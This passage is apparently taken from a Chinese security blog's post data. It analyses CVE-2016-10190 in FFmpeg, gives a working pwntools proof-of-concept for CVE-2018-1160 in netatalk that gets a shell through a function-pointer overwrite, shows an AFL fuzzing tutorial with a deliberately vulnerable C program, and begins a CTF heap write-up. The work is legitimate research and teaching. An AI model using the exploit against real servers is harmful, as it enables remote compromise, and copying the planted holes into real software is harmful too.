class=\"number\">16</span>);</span><br></pre></td></tr></table></figure>\n<p>利用<code>FFMIN</code>函数处理被转化的<code>s-&gt;chunksize</code>。该函数作用是返回两个数中的最小数。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1267</span>         size = FFMIN(size, s-&gt;chunksize);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// #define FFMIN(a,b) ((a) &gt; (b) ? (b) : (a))</span></span><br></pre></td></tr></table></figure>\n<p>分析知size的初始值为0x8000。通过上文我们得知<code>s-&gt;chunksize</code>作为有符号整数可以表示负数，若此时此变量确为负数，则size恒等于0x8000。</p>\n<p>最后调用<code>http_buf_read</code>函数，将size作为参数传入。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1273</span>     read_ret = http_buf_read(h, buf, size);</span><br></pre></td></tr></table></figure>\n<p><code>http_buf_read</code>同样被定义在<code>libavformat/http.c</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1166</span> <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">http_buf_read</span><span class=\"params\">(URLContext *h, <span class=\"keyword\">uint8_t</span> *buf, <span class=\"keyword\">int</span> size)</span></span></span><br><span class=\"line\"><span class=\"function\">1167 </span>&#123;</span><br><span class=\"line\"><span class=\"number\">1168</span>     HTTPContext *s = h-&gt;priv_data;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1182</span>         len = ffurl_read(s-&gt;hd, buf, size);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1198</span> &#125;</span><br></pre></td></tr></table></figure>\n<p>其中调用了被定义在<code>libavformat/avio.c</code>的<code>ffurl_read</code>函数。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">407</span> <span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">ffurl_read</span><span class=\"params\">(URLContext *h, <span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> *buf, <span class=\"keyword\">int</span> size)</span></span></span><br><span class=\"line\"><span class=\"function\">408 </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">411</span>     <span class=\"keyword\">return</span> retry_transfer_wrapper(h, buf, size, <span class=\"number\">1</span>, h-&gt;prot-&gt;url_read);</span><br><span class=\"line\"><span class=\"number\">412</span> &#125;</span><br></pre></td></tr></table></figure>\n<p>可以看到该函数实际调用了<code>retry_transfer_wrapper</code>函数，其中<code>h-&gt;prot-&gt;url_read</code>是指向函数<code>tcp_read</code>的指针。</p>\n<p><code>tcp_read</code>是定义在<code>libavformat/tcp.c</code> 中的函数。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">201</span> <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">tcp_read</span><span class=\"params\">(URLContext *h, <span class=\"keyword\">uint8_t</span> *buf, <span class=\"keyword\">int</span> size)</span></span></span><br><span class=\"line\"><span class=\"function\">202 </span>&#123;</span><br><span class=\"line\"><span class=\"number\">203</span>     TCPContext *s = h-&gt;priv_data;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">211</span>     ret = recv(s-&gt;fd, buf, size, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">213</span> &#125;</span><br></pre></td></tr></table></figure>\n<p>由于<code>recv</code>返回一个<code>size_t</code>类型的<code>len</code>变量，该类型为无符号整数，而被传入的变量<code>size</code>为有符号整数。</p>\n<p>例如当该size值为-1， 在<code>ret = recv(s-&gt;fd, buf, size, 0);</code>步骤中，它将会被返回为无符号整数<code>0xffffffffffffffff</code>。</p>\n<p>这将导致<code>recv</code>读取远超原本大小为0x8000size的数据进入缓冲区，从而导致堆溢出，若该溢出能够覆盖函数指针，则可能导致RCE成功。</p>\n<p>在 Paul Cher的POC中我们可以找到一个位于缓冲区0x8060偏移处的对象<code>AVIOContext</code>。</p>\n<p>该对象包含字段<code>int (*read_packet)(void *, uint8_t *, int);</code>。此字段在函数<code>avio_read</code>中被引用，并且函数将会被程序调用，因此我们可以修改该字段从而实现RCE。</p>\n<h2><span id=\"exp分析\">exp分析</span></h2><h3><span id=\"exp大致逻辑\">exp大致逻辑：</span></h3><ol>\n<li>输入负数，引发bug</li>\n<li>覆盖缓冲区，修改指针，进行栈迁移。</li>\n<li>将shellcode写入栈中，并构造rop链调用mprotect函数使栈可执行。</li>\n<li>执行shellcode，getshell。</li>\n</ol>\n<p>具体就不放了。</p>\n<h2><span id=\"8-参考链接\">8 参考链接</span></h2><p><a href=\"https://nandynarwhals.org/cve-2016-10190/\">https://nandynarwhals.org/cve-2016-10190/</a></p>\n<p><a href=\"https://paper.seebug.org/253/\">https://paper.seebug.org/253/</a></p>\n<p><a href=\"https://blog.csdn.net/m0_46687377/article/details/118185115\">https://blog.csdn.net/m0_46687377/article/details/118185115</a></p>\n","categories":["Binary_security"],"tags":["cve"]},{"title":"cve-2018-1160分析","url":"/2022/10/15/cve-2018-1160/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-PFBOApOv\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<p>呃呃，这是一个阉割版，但是懒得改了，原文+代码 2.5w字，真的没那么敷衍的。</p>\n<h2><span id=\"环境搭建\">环境搭建</span></h2><p>ubuntu 18.04 （libc-2.27.so）</p>\n<p>netatalk 二进制文件-》可以在pwnable上找到编译好的文件，非常方便。</p>\n<h2><span id=\"4漏洞复现\">4：漏洞复现</span></h2><p>关闭地址随机化。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo bash -c <span class=\"string\">&quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</span></span><br></pre></td></tr></table></figure>\n<h3><span id=\"poc\">poc</span></h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(endian=<span class=\"string\">&#x27;little&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">ip   = <span class=\"string\">&quot;127.0.0.1&quot;</span></span><br><span class=\"line\">port = <span class=\"number\">5566</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">gen_dsi</span>(<span class=\"params\">data</span>):</span></span><br><span class=\"line\">    dsi  = <span class=\"string\">b&#x27;\\x00\\x04\\x00\\x01&#x27;</span></span><br><span class=\"line\">    dsi += p32(<span class=\"number\">0</span>)</span><br><span class=\"line\">    dsi += p32(<span class=\"built_in\">len</span>(data),endian=<span class=\"string\">&#x27;big&#x27;</span>)</span><br><span class=\"line\">    dsi += p32(<span class=\"number\">0</span>)</span><br><span class=\"line\">    dsi += data</span><br><span class=\"line\">    <span class=\"keyword\">return</span> dsi</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">aaw</span>(<span class=\"params\">io,addr,data</span>):</span></span><br><span class=\"line\">    payload  = <span class=\"string\">b&#x27;\\x01&#x27;</span>+ p8(<span class=\"number\">0x18</span>)+ <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span> + p64(addr)</span><br><span class=\"line\">    io.send(gen_dsi(payload))</span><br><span class=\"line\">    io.recv()</span><br><span class=\"line\">    io.send(gen_dsi(data))</span><br><span class=\"line\"></span><br><span class=\"line\">libc_addr  = <span class=\"number\">0x7f36e0364000</span> </span><br><span class=\"line\">rtld       = <span class=\"number\">0x7f36e0a58060</span></span><br><span class=\"line\">system = libc_addr + libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">io = remote(ip,port)</span><br><span class=\"line\">cmd = <span class=\"string\">b&#x27;/bin/sh;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">aaw(io,rtld+<span class=\"number\">2312</span>,cmd.ljust(<span class=\"number\">0x600</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(system))</span><br><span class=\"line\">io.close()    </span><br></pre></td></tr></table></figure>\n<p>解压<code>natatalk.tar</code>,进入文件夹，第一个终端启动afpd：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">LD_PRELOAD=<span class=\"string\">&quot;./libatalk.so.18&quot;</span>  ./afpd -d -F ./afp.conf</span><br></pre></td></tr></table></figure>\n<p>可以看到进程执行中：</p>\n<p>另开第二个终端：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">rin@rin-virtual-machine:~$ sudo netstat -pantu | grep 5566</span><br><span class=\"line\">[sudo] password <span class=\"keyword\">for</span> rin: </span><br><span class=\"line\">tcp6       0      0 :::5566                 :::*                    LISTEN      17266/./afpd   </span><br></pre></td></tr></table></figure>\n<p>可以看到成功运行，pid为17266，另开一个终端执行exp，可以看到进程快速断开，大约等待三分钟，可以看到<code>afpd</code>进程这边收到shell。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20221015102054467.png\" alt=\"image-20221015102054467\"></p>\n<h2><span id=\"利用\">利用</span></h2><p>先溢出<code>attn_quantum</code>字段，注意到<code>*commands</code>是一个指针，用作接受DSI payload数据部分的buffer，因此我们可以通过在同一个socket中发送两次DSI消息，实现任意地址写：第一次发送的消息，覆盖<code>commands</code>指针为目标地址（如<code>free_hook</code>地址）；第二次发送的消息，触发<code>dsi_stream_receive()</code>函数，向目标地址中写入任意内容，长度可由<code>dsi-&gt;header.dsi_len</code>指定,从而实现RCE。</p>\n<p>exp参考轩哥，yyds。</p>\n","categories":["Binary_security"],"tags":["cve"]},{"title":"再识AFL","url":"/2022/10/22/fuzz_%E5%86%8D%E8%AF%86AFL/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h2><span id=\"0\">0</span></h2><p>​        其实大概半年前就已经搭建过环境，成功运行过AFL了，但是当时完全只是在看图说话，对这个东西没有任何系统的认识。现在趁着愉快的周末时间学习一会儿。</p>\n<h2><span id=\"环境搭建\">环境搭建</span></h2><p>​        这里提前防止PD背刺无法使用嵌套虚拟化，选用vmware ，搭的是ubuntu20.04 lts的环境。顺带插一句，只要把“针对游戏优化”关掉就能让鼠标在虚拟机和物理机之间顺畅移动。</p>\n<p>首先是安装一些必要软件。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt install clang</span><br><span class=\"line\">sudo apt install llvm</span><br></pre></td></tr></table></figure>\n<p>接着编译afl</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget http://lcamtuf.coredump.cx/afl/releases/afl-2.52b.tgz</span><br><span class=\"line\">tar -zxvf afl-2.52b.tgz</span><br><span class=\"line\"><span class=\"built_in\">cd</span> afl-2.52b</span><br><span class=\"line\">make</span><br><span class=\"line\">sudo make install</span><br></pre></td></tr></table></figure>\n<p>只按以上指令执行我印象中是会有一些依赖的问题，但是时间太过久远，也不是什么关键问题，就忽略了。</p>\n<p>编译好是这个界面：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-22%20%E4%B8%8B%E5%8D%884.29.13.png\" alt=\"截屏2022-10-22 下午4.29.13\"></p>\n<h2><span id=\"试用1\">试用1</span></h2><p>利用afl提供的编译器编译代码（以便于插桩）。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">../afl-gcc -g -o vul1 ./vul1.c </span><br></pre></td></tr></table></figure>\n<p><img src=\"/Users/rin/Desktop/截屏2022-10-22 下午4.31.15.png\" alt=\"截屏2022-10-22 下午4.31.15\"></p>\n<p>然后我们需要建立我们的输入，以及输出文件夹。分别创建文件夹 <code>in</code>和<code>out</code>。这个1就是为这个漏洞程序构建的语料。可以看到是一连串垃圾字符。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-22%20%E4%B8%8B%E5%8D%884.34.23.png\" alt=\"截屏2022-10-22 下午4.34.23\"></p>\n<p>最后</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">./afl-fuzz -i ./<span class=\"keyword\">in</span> -o ./out ./<span class=\"built_in\">test</span>/vul1</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-22%20%E4%B8%8B%E5%8D%884.42.07.png\" alt=\"截屏2022-10-22 下午4.42.07\"></p>\n<h2><span id=\"一些功能amp参数\">一些功能&amp;参数</span></h2><h5><span id=\"process-timing\">process timing</span></h5><p>运行时长，最近找到的的路径、崩溃、挂起的时间。</p>\n<h5><span id=\"overall-results\">overall results</span></h5><p>完成的循环数、找到的总路径数，崩溃及挂起数</p>\n<h5><span id=\"cycle-progress\">cycle progress</span></h5><p>本次循环进度。</p>\n<h5><span id=\"map-coverage\">map coverage</span></h5><p>目标二进制文件中的插桩代码所观察到覆盖范围的细节。</p>\n<h5><span id=\"stage-progress\">stage progress</span></h5><p>执行的文件的变异策略、执行次数和执行速度。</p>\n<h5><span id=\"fuzzing-strategy-yields\">Fuzzing strategy yields</span></h5><p>模糊测试策略的结果。</p>\n<h2><span id=\"试用2\">试用2</span></h2><p>这次还是利用上一次的代码&amp;二进制文件，我们利用afl提供给我们的默认的语料。</p>\n<p>代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span> </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span> </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span> </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span> </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;signal.h&gt;</span> </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">vuln</span><span class=\"params\">(<span class=\"keyword\">char</span> *str)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> len = <span class=\"built_in\">strlen</span>(str);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(str[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;A&#x27;</span> &amp;&amp; len == <span class=\"number\">66</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        raise(SIGSEGV);</span><br><span class=\"line\">        <span class=\"comment\">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(str[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;F&#x27;</span> &amp;&amp; len == <span class=\"number\">6</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        raise(SIGSEGV);</span><br><span class=\"line\">        <span class=\"comment\">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;it is good!\\n&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> *argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> buf[<span class=\"number\">100</span>]=&#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    gets(buf);<span class=\"comment\">//存在栈溢出漏洞</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(buf);<span class=\"comment\">//存在格式化字符串漏洞</span></span><br><span class=\"line\">    vuln(buf);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">./afl-fuzz -i ./testcases/ -o ./out ./<span class=\"built_in\">test</span>/vul1</span><br></pre></td></tr></table></figure>\n<p>跑。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-22%20%E4%B8%8B%E5%8D%885.32.10.png\" alt=\"截屏2022-10-22 下午5.32.10\"></p>\n<p>我跑到这里就结束进程了。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-22%20%E4%B8%8B%E5%8D%885.32.45.png\" alt=\"截屏2022-10-22 下午5.32.45\"></p>\n<p><code>out</code>中多了很多文件。依次打开来看看：</p>\n<h4><span id=\"fuzzer_stats\">fuzzer_stats</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-22%20%E4%B8%8B%E5%8D%885.34.40.png\" alt=\"截屏2022-10-22 下午5.34.40\"></p>\n<p>就是显示了fuzz过程的一些信息。</p>\n<h4><span id=\"fuzz_bitmap\">fuzz_bitmap</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-22%20%E4%B8%8B%E5%8D%885.36.21.png\" alt=\"截屏2022-10-22 下午5.36.21\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-22%20%E4%B8%8B%E5%8D%885.37.05.png\" alt=\"截屏2022-10-22 下午5.37.05\"></p>\n<p>？？</p>\n<h4><span id=\"plot_data\">plot_data</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-22%20%E4%B8%8B%E5%8D%885.39.00.png\" alt=\"截屏2022-10-22 下午5.39.00\"></p>\n<p>还是什么相关的信息。</p>\n<h4><span id=\"quene\">quene</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-22%20%E4%B8%8B%E5%8D%885.40.31.png\" alt=\"截屏2022-10-22 下午5.40.31\"></p>\n<p>？</p>\n<h4><span id=\"crashes\">crashes</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-22%20%E4%B8%8B%E5%8D%885.43.14.png\" alt=\"截屏2022-10-22 下午5.43.14\"></p>\n<p>这个就是需要我们认真分析的数据了，整理一下就是：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">1:��<span class=\"string\">&#x27;�����*&#x27;</span>9<span class=\"string\">&#x27;&#x27;</span>��*<span class=\"string\">&#x27;���k��f�&#x27;</span><span class=\"string\">&#x27;.\t&#x27;</span><span class=\"string\">&#x27;.&#x27;</span>9<span class=\"string\">&#x27;&#x27;</span>��*<span class=\"string\">&#x27;9&#x27;</span><span class=\"string\">&#x27;��*&#x27;</span><span class=\"string\">&#x27;&#x27;</span>\t<span class=\"string\">&#x27;&#x27;</span>P<span class=\"string\">&#x27;���k��f���&#x27;</span><span class=\"string\">&#x27;����������...���@&#x27;</span></span><br><span class=\"line\">2:��dddj�dA@@@@3@@�Xddt��?ddddddddddddd�X���?ddddddddddddd�X����������ddd� �%������ddd� ���@@��\\���Xd�����������ddd���Wd�d��</span><br><span class=\"line\">3:5%n��� //触发格式化字符串</span><br><span class=\"line\">4:F====P //首字母为F，len为6</span><br></pre></td></tr></table></figure>\n<p>可以看到找到了两个漏洞。</p>\n<p>maker一下这几篇文章</p>\n<p><a href=\"https://bbs.pediy.com/thread-273639.htm#msg_header_h2_5\">https://bbs.pediy.com/thread-273639.htm#msg_header_h2_5</a></p>\n<p><a href=\"https://myfzy.top/2021/03/04/AFL/#编译并安装AFL\">https://myfzy.top/2021/03/04/AFL/#编译并安装AFL</a></p>\n<h2><span id=\"参考\">参考</span></h2><p><a href=\"https://cjovi.icu/fuzzing/1138.html\">https://cjovi.icu/fuzzing/1138.html</a></p>\n<p><a href=\"https://cjovi.icu/fuzzing/1140.html\">https://cjovi.icu/fuzzing/1140.html</a></p>\n","categories":["Binary_security"],"tags":["FUZZ_AFL"]},{"title":"examination","url":"/2022/04/16/heap_challenge_*ctf_2022_examination/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-gENHgctF\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h1><span id=\"overivew\">overivew</span></h1><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-21%20%E4%B8%8B%E5%8D%888.26.01.png\" alt=\"截屏2022-04-21 下午8.26.01\"></p>\n<p>​        其实把程序简化来看的话就是一道比较常规的chunk overlapping，漏洞很明显，但是又不完全明显，需要先认真把程序逆清楚。在pwn题的几个环节中，逆向确定漏洞点，分析漏洞寻找思路，写exp布置堆风水，调试扣细节，我觉得最头疼的可能就是逆向了，虽然过程也许不难，但是真的很bewilder。</p>\n<p>​        其实这个程序看似非常复杂，菜单就写了十五分钟，但逆来逆去最关键居然的还是那个一眼uint溢出的漏洞，真的很难绷。利用它获得heap base和任意地址加1，于是比较自然的思路就是构造一个off by one进行chunk overlap。虽然但是当时花了大半天时间看musl pwn，没看出来，晚上还被拉出去看电影了，于是examination也懒得看了。主要是逆向逆得脑壳疼，程序没逆干净那个任意地址+1也没有利用的完整思路，晚上十点多坐在麦当劳写了会儿菜单就爬了，总共也没看超过一个小时，第二天起床发现学长通宵排堆结果失误了，确实没有绷住。这么会堆风水，以后职业算卦好了。</p>\n<p>​        ps:官方wp给出的方式是修改tcache管理结构体，这个方法有时间的话可以研究一下，但是这里就是用比较常规的思想走吧。</p>\n<h1><span id=\"逆向\">逆向</span></h1><h2><span id=\"switch结构修复\">switch结构修复</span></h2><p>​        ida7.7一打开就是正常识别的状态，但是7.7以下需要对switch结构进行修复。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-17%20%E4%B8%8B%E5%8D%887.53.43.png\" alt=\"截屏2022-04-17 下午7.53.43\"></p>\n<p>​        第二个switch表修复后f5还是显示<code>jmp rax</code>，这时候连续多f5几次就行。</p>\n<h2><span id=\"teacher\">teacher</span></h2><h3><span id=\"add-student\">add student</span></h3><p>​        calloc 一个0x20size chunk1，一个0x18size chunk2，并将2的ptr写入1指向的空间。</p>\n<p>bss段上定义一个结构体，第一个字段为chunk1 ptr，然后输入question的数量，并将数量存入chunk2，也就是<code>**chunk1 ptr</code>。</p>\n<p>大致的字段如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">head[<span class=\"number\">1</span>] = chunk1_ptr</span><br><span class=\"line\">*chunk1_ptr = chunk2_ptr</span><br><span class=\"line\">*chunk2_ptr = num</span><br></pre></td></tr></table></figure>\n<h3><span id=\"give-scores\">give scores</span></h3><p>​        改卷，这个read暂时不管，然后生成学生的成绩。这时如果:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( *(_DWORD *)(head[i] + <span class=\"number\">24LL</span>) == <span class=\"number\">1</span> )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;the student is lazy! b@d!&quot;</span>);</span><br><span class=\"line\">  v2 -= <span class=\"number\">10</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">*(_DWORD *)(*(_QWORD *)head[i] + <span class=\"number\">4LL</span>) = v2;</span><br></pre></td></tr></table></figure>\n<p>​        v2是个uint，考虑可以溢出。</p>\n<h3><span id=\"review\">review</span></h3><p>​        为学生添加一个review，然后在<code>*(head[idx] + 8LL)</code>创建comment chunk，将size保存在<code>*(head[idx] + 16)</code>。</p>\n<h3><span id=\"call\">call</span></h3><p>​        类似free。只有三次机会。没有uaf。</p>\n<h3><span id=\"never_pray\">never_pray</span></h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">v0 = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x300</span>uLL);</span><br><span class=\"line\">read_str(<span class=\"number\">0LL</span>, v0, <span class=\"number\">768LL</span>);</span><br></pre></td></tr></table></figure>\n<p>下辈子再逆吧。</p>\n<h1><span id=\"思路\">思路</span></h1><p>​        这个part只是寻找思路，不管堆风水啥的。</p>\n<h2><span id=\"get-reward\">get reward</span></h2><p>​        首先一眼uint溢出，鉴定为真。乱利用一下。</p>\n<p>​        先看teacher module 的give score part。</p>\n<p>​        如果要执行到lazy,需要满足一些条件。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">  buf[<span class=\"number\">0</span>] &amp;= <span class=\"number\">127u</span>;</span><br><span class=\"line\">  score = buf[<span class=\"number\">0</span>] % (<span class=\"number\">10</span> * chunk_list[i]-&gt;info_ptr-&gt;quesNum);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;score for the %dth student is %d\\n&quot;</span>, i, score);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( LODWORD(chunk_list[i]-&gt;is_lazy_pray_union) == <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;the student is lazy! b@d!&quot;</span>);</span><br><span class=\"line\">    score -= <span class=\"number\">10</span>;                              <span class=\"comment\">// overflow</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  chunk_list[i]-&gt;info_ptr-&gt;score = score;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">&quot;finish&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>​        首先确定score的值。</p>\n<p>​        它的最初值来源于</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">score = buf[<span class=\"number\">0</span>] % (<span class=\"number\">10</span> * chunk_list[i]-&gt;info_ptr-&gt;quesNum);<span class=\"comment\">//？？？？？？？</span></span><br></pre></td></tr></table></figure>\n<p>​        而这个buf0来源于：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt; count; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( read(fd, buf, <span class=\"number\">8uLL</span>) != <span class=\"number\">8</span> )             <span class=\"comment\">// fd is point to a random number</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;read_error&quot;</span>);</span><br><span class=\"line\">      <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    buf[<span class=\"number\">0</span>] &amp;= <span class=\"number\">0x7F</span>u;</span><br></pre></td></tr></table></figure>\n<p>​        所以buf[0]就是一个只有7位的随机数，最大值为127。</p>\n<p>​        这里有一个 <code>is_lazy_pray_union</code>,在stu module的pray part中被设置。只要stu第一次pray的话就会被设置为1。</p>\n<p>​        所以大概一个这样的步骤就能稳定get reward。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">io.recvuntil(<span 